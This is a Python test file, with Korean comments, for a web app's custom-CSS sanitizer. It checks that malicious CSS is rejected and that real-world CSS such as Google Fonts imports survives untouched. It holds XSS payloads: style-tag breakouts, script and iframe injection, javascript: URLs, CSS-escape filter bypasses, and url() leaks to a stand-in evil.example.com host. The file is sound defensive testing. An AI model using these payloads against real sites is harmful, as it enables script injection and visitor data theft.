"""``custom_css`` 검사기 테스트 (감사 M-9).

## 왜 셸 heredoc 이 아니라 파일 테스트인가

처음엔 prod 컨테이너에 heredoc 으로 악성 CSS 를 흘려 검증했는데, **셸 따옴표가 백슬래시를
먹어** ``\\6a`` 가 파이썬의 8진 이스케이프 ``\\6`` + ``a`` 로 바뀌었다. 검사기는 진짜
CSS 이스케이프를 **본 적이 없는데** 테스트는 통과했다 — 전형적인 무의미한 통과다.
백슬래시가 들어가는 검증은 반드시 파일에 담아 돌린다. [[validate-detectors-against-broken-version]]

## 이 테스트가 지키는 두 가지

1. **악성이 잡히는가** — 특히 ``</style>`` 브레이크아웃(공개 페이지가 로그인 앱과 같은
   오리진이라 방문자 세션까지 노린다)과 CSS 이스케이프 우회.
2. **정상이 안 깨지는가** — 실서비스 19곳이 ``@import`` 로 구글 폰트를 부른다. 교과서대로
   막으면 그 페이지들의 글꼴이 즉시 깨진다. 그래서 허용목록 방식이고, 이걸 회귀로 박아둔다.
"""

import pytest

from apps.pages.sanitizers import CssSanitizeError, sanitize_custom_css

# ──────────────────────────────────────────────────────────────────────────────
# 저장을 거부해야 하는 것 — 정상 CSS 에는 나올 수 없는 구문
# ──────────────────────────────────────────────────────────────────────────────

REJECT_CASES = [
    ("style 브레이크아웃", "body{color:red}</style><img src=x onerror=alert(1)>"),
    ("대소문자 혼합", "a{}</STYLE ><script>alert(1)</script>"),
    ("공백 낀 닫기", "a{}</ style><script>alert(1)</script>"),
    ("script 태그", "body{}<script>alert(1)</script>"),
    ("iframe 태그", "body{}<iframe src=//evil.example.com></iframe>"),
    ("javascript URL", "body{background:url(javascript:alert(1))}"),
    ("vbscript URL", "body{background:url(vbscript:msgbox(1))}"),
    ("expression()", "body{width:expression(alert(1))}"),
    ("behavior", "body{behavior:url(x.htc)}"),
    ("moz-binding", "body{-moz-binding:url(http://evil.example.com/x.xml#y)}"),
]


@pytest.mark.parametrize("label,css", REJECT_CASES, ids=[c[0] for c in REJECT_CASES])
def test_dangerous_css_is_rejected(label, css):
    with pytest.raises(CssSanitizeError):
        sanitize_custom_css(css)


def test_css_escape_bypass_is_rejected():
    r"""★ ``\6a\61\76\61\73\63\72\69\70\74:`` = ``javascript:`` 를 이스케이프로 숨긴 것.

    검사 전에 이스케이프를 풀지 않으면 그대로 통과한다. 이 문자열은 셸을 거치면
    망가지므로 반드시 파일에 담아 검증해야 한다(모듈 docstring 참고).
    """
    css = "body{background:url(\\6a\\61\\76\\61\\73\\63\\72\\69\\70\\74:alert(1))}"
    # 진짜 이스케이프인지 먼저 자체 확인 — 셸/편집기가 먹었으면 여기서 걸린다
    assert "\\6a" in css and css.count("\\") == 10

    with pytest.raises(CssSanitizeError) as exc:
        sanitize_custom_css(css)
    assert "javascript" in exc.value.reason.lower()


def test_escaped_style_breakout_is_rejected():
    r"""``<\/style>`` 처럼 이스케이프로 숨긴 브레이크아웃."""
    css = "body{}<\\2f style><script>alert(1)</script>"
    with pytest.raises(CssSanitizeError):
        sanitize_custom_css(css)


# ──────────────────────────────────────────────────────────────────────────────
# URL 만 제거하고 나머지는 살려야 하는 것
# ──────────────────────────────────────────────────────────────────────────────


def test_external_url_is_stripped_but_css_survives():
    """외부 이미지는 방문자 정보 유출 통로 → url() 만 none 으로 바꾸고 CSS 는 살린다."""
    css = "body{background:url(https://evil.example.com/leak.png);color:red}"
    cleaned, removed = sanitize_custom_css(css)
    assert "evil.example.com" not in cleaned
    assert "color:red" in cleaned, "허용된 선언까지 날아갔다"
    assert removed


def test_external_import_is_stripped():
    css = "@import url(https://evil.example.com/x.css);\nbody{color:red}"
    cleaned, removed = sanitize_custom_css(css)
    assert "evil.example.com" not in cleaned
    assert "color:red" in cleaned
    assert removed


def test_data_text_html_is_not_allowed():
    """data:text/html 은 브레이크아웃 통로 — data: 라고 다 허용하면 안 된다."""
    css = "body{background:url(data:text/html;base64,PHN2Zz4=)}"
    cleaned, removed = sanitize_custom_css(css)
    assert removed, "data:text/html 이 통과했다"


# ──────────────────────────────────────────────────────────────────────────────
# 절대 건드리면 안 되는 것 — 실서비스가 쓰는 형태
# ──────────────────────────────────────────────────────────────────────────────

KEEP_CASES = [
    (
        "구글 폰트 import(따옴표)",
        "@import url('https://fonts.googleapis.com/css2?family=Jua&display=swap');\nbody{color:red}",
    ),
    (
        "구글 폰트 import(따옴표 없음)",
        "@import url(https://fonts.googleapis.com/css2?family=Cinzel:wght@500);",
    ),
    ("구글 폰트 문자열형 import", '@import "https://fonts.googleapis.com/css2?family=Caveat";'),
    ("gstatic 폰트 파일", "@font-face{src:url(https://fonts.gstatic.com/s/x.woff2)}"),
    (
        "우리 R2 이미지",
        "body{background:url(https://media.turnflow.clfy.ai.kr/pages/2026/03/x.webp)}",
    ),
    ("내부 SVG 필터(#)", ".a{filter:url(#noise)}"),
    ("내부 SVG 필터(%23)", ".a{filter:url(%23noise)}"),
    ("data:image", "body{background:url(data:image/png;base64,iVBORw0KGgo=)}"),
    ("상대 경로", "body{background:url(/static/bg.png)}"),
    ("평범한 CSS", ".page-container{overflow-y:auto;color:#333;transition:all .2s}"),
    ("content 에 꺾쇠", '.a::before{content:"<"}'),
    ("미디어쿼리·키프레임", "@media(max-width:600px){.a{display:none}}@keyframes k{to{opacity:1}}"),
]


@pytest.mark.parametrize("label,css", KEEP_CASES, ids=[c[0] for c in KEEP_CASES])
def test_legitimate_css_is_untouched(label, css):
    cleaned, removed = sanitize_custom_css(css)
    assert removed == [], f"정상 CSS 에서 {removed} 를 제거했다"
    assert cleaned == css, "정상 CSS 가 변형됐다"


def test_empty_and_none_are_safe():
    assert sanitize_custom_css("") == ("", [])
    assert sanitize_custom_css(None) == ("", [])


def test_allowed_hosts_are_configurable(settings):
    """고객이 다른 호스트를 필요로 하면 배포 없이 늘릴 수 있어야 한다."""
    css = "body{background:url(https://cdn.example.com/a.png)}"
    _, removed = sanitize_custom_css(css)
    assert removed, "기본값에서는 막혀야 한다"

    settings.CUSTOM_CSS_ALLOWED_URL_HOSTS = ["cdn.example.com"]
    cleaned, removed = sanitize_custom_css(css)
    assert removed == [] and cleaned == css


def test_real_prod_shaped_css_is_untouched():
    """2026-08-12 prod 실데이터에서 뽑은 형태 — 이게 깨지면 고객 페이지가 깨진다."""
    css = (
        "/* 내부 스크롤 컨테이너에 타임라인 생성 */\n"
        "@import url('https://fonts.googleapis.com/css2?family=Gowun+Batang:wght@400');\n"
        ".page-container{overflow-y:auto;overflow-x:hidden;position:relative}\n"
        ".hero{background:url(https://media.turnflow.clfy.ai.kr/pages/2026/03/bg.webp) center/cover}\n"
        ".noise{filter:url(%23n)}\n"
    )
    cleaned, removed = sanitize_custom_css(css)
    assert removed == []
    assert cleaned == css
